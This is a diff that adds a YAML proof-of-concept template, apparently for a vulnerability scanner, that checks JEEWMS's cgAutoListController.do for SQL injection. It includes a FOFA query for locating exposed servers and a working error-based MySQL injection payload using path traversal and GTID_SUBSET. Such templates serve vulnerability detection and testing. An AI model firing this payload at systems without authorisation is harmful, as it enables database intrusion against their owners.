@@ -1,0 +1,17 @@
+id: poc-yaml-jeewms-cgautolistcontroller-sqli
+info:
+  name: JEEWMS cgAutoListController.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: jeewms
+  fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /rest/../cgAutoListController.do?datagrid&configId=1%27+AND+GTID_SUBSET%28CONCAT%28md5({{.t1}})%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x7e%29%2C4503%29--+wnMN
+  expression: status_code == 200 && contains(body,"Exception!") && contains(body,"Malformed
+    GTID set specification") && contains(body,"错误描述") && contains(body,t2)
+transport: http
